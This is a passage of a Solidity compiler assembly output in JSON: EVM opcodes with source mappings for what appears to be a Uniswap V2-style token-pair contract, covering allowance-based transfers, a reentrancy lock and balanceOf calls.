										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2790,
											"end": 2806,
											"name": "SWAP5"
										},
										{
											"begin": 2790,
											"end": 2806,
											"name": "DUP6"
										},
										{
											"begin": 2790,
											"end": 2806,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 2790,
											"end": 2806,
											"name": "SWAP2"
										},
										{
											"begin": 2790,
											"end": 2806,
											"name": "DUP3"
										},
										{
											"begin": 2790,
											"end": 2806,
											"name": "AND"
										},
										{
											"begin": 2790,
											"end": 2806,
											"name": "OR"
										},
										{
											"begin": 2790,
											"end": 2806,
											"name": "SWAP1"
										},
										{
											"begin": 2790,
											"end": 2806,
											"name": "SWAP2"
										},
										{
											"begin": 2790,
											"end": 2806,
											"name": "SSTORE"
										},
										{
											"begin": 2816,
											"end": 2822,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "DUP1"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "SLOAD"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "SWAP4"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "SWAP1"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "SWAP5"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "AND"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "SWAP3"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "AND"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "SWAP2"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "SWAP1"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "SWAP2"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "OR"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "SWAP1"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "SWAP2"
										},
										{
											"begin": 2816,
											"end": 2832,
											"name": "SSTORE"
										},
										{
											"begin": 2842,
											"end": 2848,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 2842,
											"end": 2858,
											"name": "SSTORE"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "tag",
											"value": "64"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "JUMPDEST"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "SLOAD"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "DUP2"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "tag",
											"value": "67"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "DUP4"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "AND"
										},
										{
											"begin": 3261,
											"end": 3265,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "SWAP1"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "DUP2"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "MSTORE"
										},
										{
											"begin": 3281,
											"end": 3290,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "SWAP1"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "DUP2"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "MSTORE"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "DUP1"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "DUP4"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "KECCAK256"
										},
										{
											"begin": 3297,
											"end": 3307,
											"name": "CALLER"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "DUP5"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "MSTORE"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "SWAP1"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "SWAP2"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "MSTORE"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "DUP2"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "KECCAK256"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 3281,
											"end": 3323,
											"name": "EQ"
										},
										{
											"begin": 3277,
											"end": 3448,
											"name": "PUSH [tag]",
											"value": "187"
										},
										{
											"begin": 3277,
											"end": 3448,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "DUP5"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "AND"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "SWAP1"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "DUP2"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "MSTORE"
										},
										{
											"begin": 3369,
											"end": 3378,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "SWAP1"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "DUP2"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "MSTORE"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "DUP1"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "DUP4"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "KECCAK256"
										},
										{
											"begin": 3385,
											"end": 3395,
											"name": "CALLER"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "DUP5"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "MSTORE"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "SWAP1"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "SWAP2"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "MSTORE"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "SWAP1"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "KECCAK256"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "SLOAD"
										},
										{
											"begin": 3369,
											"end": 3437,
											"name": "PUSH [tag]",
											"value": "188"
										},
										{
											"begin": 3369,
											"end": 3437,
											"name": "SWAP1"
										},
										{
											"begin": 3418,
											"end": 3423,
											"name": "DUP4"
										},
										{
											"begin": 3369,
											"end": 3437,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3369,
											"end": 3400,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 3369,
											"end": 3437,
											"name": "AND"
										},
										{
											"begin": 3369,
											"end": 3437,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3369,
											"end": 3437,
											"name": "tag",
											"value": "188"
										},
										{
											"begin": 3369,
											"end": 3437,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "DUP6"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "AND"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "SWAP1"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "DUP2"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "MSTORE"
										},
										{
											"begin": 3339,
											"end": 3348,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "SWAP1"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "DUP2"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "MSTORE"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "DUP1"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "DUP4"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "KECCAK256"
										},
										{
											"begin": 3355,
											"end": 3365,
											"name": "CALLER"
										},
										{
											"begin": 3339,
											"end": 3366,
											"name": "DUP5"
										},
										{
											"begin": 3339,
											"end": 3366,
											"name": "MSTORE"
										},
										{
											"begin": 3339,
											"end": 3366,
											"name": "SWAP1"
										},
										{
											"begin": 3339,
											"end": 3366,
											"name": "SWAP2"
										},
										{
											"begin": 3339,
											"end": 3366,
											"name": "MSTORE"
										},
										{
											"begin": 3339,
											"end": 3366,
											"name": "SWAP1"
										},
										{
											"begin": 3339,
											"end": 3366,
											"name": "KECCAK256"
										},
										{
											"begin": 3339,
											"end": 3437,
											"name": "SSTORE"
										},
										{
											"begin": 3277,
											"end": 3448,
											"name": "tag",
											"value": "187"
										},
										{
											"begin": 3277,
											"end": 3448,
											"name": "JUMPDEST"
										},
										{
											"begin": 3457,
											"end": 3483,
											"name": "PUSH [tag]",
											"value": "189"
										},
										{
											"begin": 3467,
											"end": 3471,
											"name": "DUP5"
										},
										{
											"begin": 3473,
											"end": 3475,
											"name": "DUP5"
										},
										{
											"begin": 3477,
											"end": 3482,
											"name": "DUP5"
										},
										{
											"begin": 3457,
											"end": 3466,
											"name": "PUSH [tag]",
											"value": "190"
										},
										{
											"begin": 3457,
											"end": 3483,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3457,
											"end": 3483,
											"name": "tag",
											"value": "189"
										},
										{
											"begin": 3457,
											"end": 3483,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 3500,
											"end": 3504,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "SWAP4"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "SWAP3"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "POP"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "POP"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "POP"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "tag",
											"value": "69"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "JUMPDEST"
										},
										{
											"begin": 748,
											"end": 814,
											"name": "PUSH",
											"value": "6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "DUP2"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "tag",
											"value": "71"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "JUMPDEST"
										},
										{
											"begin": 341,
											"end": 343,
											"name": "PUSH",
											"value": "12"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "DUP2"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "tag",
											"value": "73"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "JUMPDEST"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "SLOAD"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "DUP2"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "tag",
											"value": "76"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "JUMPDEST"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "MSTORE"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "SWAP1"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "DUP2"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "MSTORE"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "SWAP1"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "KECCAK256"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "SLOAD"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "DUP2"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1047,
											"end": 1079,
											"name": "tag",
											"value": "78"
										},
										{
											"begin": 1047,
											"end": 1079,
											"name": "JUMPDEST"
										},
										{
											"begin": 1047,
											"end": 1079,
											"name": "PUSH",
											"value": "C"
										},
										{
											"begin": 1047,
											"end": 1079,
											"name": "SLOAD"
										},
										{
											"begin": 1047,
											"end": 1079,
											"name": "DUP2"
										},
										{
											"begin": 1047,
											"end": 1079,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1085,
											"end": 1117,
											"name": "tag",
											"value": "80"
										},
										{
											"begin": 1085,
											"end": 1117,
											"name": "JUMPDEST"
										},
										{
											"begin": 1085,
											"end": 1117,
											"name": "PUSH",
											"value": "D"
										},
										{
											"begin": 1085,
											"end": 1117,
											"name": "SLOAD"
										},
										{
											"begin": 1085,
											"end": 1117,
											"name": "DUP2"
										},
										{
											"begin": 1085,
											"end": 1117,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "tag",
											"value": "83"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "JUMPDEST"
										},
										{
											"begin": 5074,
											"end": 5088,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1292,
											"end": 1300,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1292,
											"end": 1300,
											"name": "SLOAD"
										},
										{
											"begin": 1304,
											"end": 1305,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1292,
											"end": 1305,
											"name": "EQ"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH [tag]",
											"value": "192"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "JUMPI"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP2"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MLOAD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP2"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SUB"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "REVERT"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "tag",
											"value": "192"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "JUMPDEST"
										},
										{
											"begin": 1346,
											"end": 1347,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1335,
											"end": 1343,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1335,
											"end": 1347,
											"name": "DUP2"
										},
										{
											"begin": 1335,
											"end": 1347,
											"name": "SWAP1"
										},
										{
											"begin": 1335,
											"end": 1347,
											"name": "SSTORE"
										},
										{
											"begin": 1346,
											"end": 1347,
											"name": "DUP1"
										},
										{
											"begin": 5143,
											"end": 5156,
											"name": "PUSH [tag]",
											"value": "194"
										},
										{
											"begin": 5143,
											"end": 5154,
											"name": "PUSH [tag]",
											"value": "54"
										},
										{
											"begin": 5143,
											"end": 5156,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5143,
											"end": 5156,
											"name": "tag",
											"value": "194"
										},
										{
											"begin": 5143,
											"end": 5156,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5204,
											"end": 5210,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 5204,
											"end": 5210,
											"name": "SLOAD"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "DUP1"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "DUP2"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "MSTORE"
										},
										{
											"begin": 5230,
											"end": 5234,
											"name": "ADDRESS"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "DUP3"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "ADD"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "MSTORE"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "SWAP1"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "MLOAD"
										},
										{
											"begin": 5100,
											"end": 5156,
											"name": "SWAP4"
										},
										{
											"begin": 5100,
											"end": 5156,
											"name": "SWAP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5100,
											"end": 5156,
											"name": "SWAP2"
										},
										{
											"begin": 5100,
											"end": 5156,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5181,
											"end": 5194,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5181,
											"end": 5194,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5204,
											"end": 5210,
											"name": "SWAP1"
										},
										{
											"begin": 5204,
											"end": 5210,
											"name": "SWAP2"
										},
										{
											"begin": 5204,
											"end": 5210,
											"name": "AND"
										},
										{
											"begin": 5204,
											"end": 5210,
											"name": "SWAP2"
										},
										{
											"begin": 5197,
											"end": 5221,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 5197,
											"end": 5221,
											"name": "SWAP2"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "DUP1"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "DUP4"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "ADD"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "SWAP3"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "SWAP3"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "SWAP2"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "SWAP1"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "DUP3"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "SWAP1"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "SUB"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "ADD"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "DUP2"
										},
										{
											"begin": 5204,
											"end": 5210,
											"name": "DUP7"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "DUP1"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "195"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "195"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "POP"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "GAS"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "STATICCALL"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "196"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "196"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "POP"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "POP"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "POP"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "POP"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "MLOAD"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "197"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "197"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "MLOAD"
										},
										{
											"begin": 5269,
											"end": 5275,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 5269,
											"end": 5275,
											"name": "SLOAD"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "DUP1"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "DUP2"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "MSTORE"
										},
										{
											"begin": 5295,
											"end": 5299,
											"name": "ADDRESS"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "DUP3"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "ADD"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "MSTORE"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "SWAP1"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "MLOAD"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "SWAP3"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5246,
											"end": 5259,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5246,
											"end": 5259,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
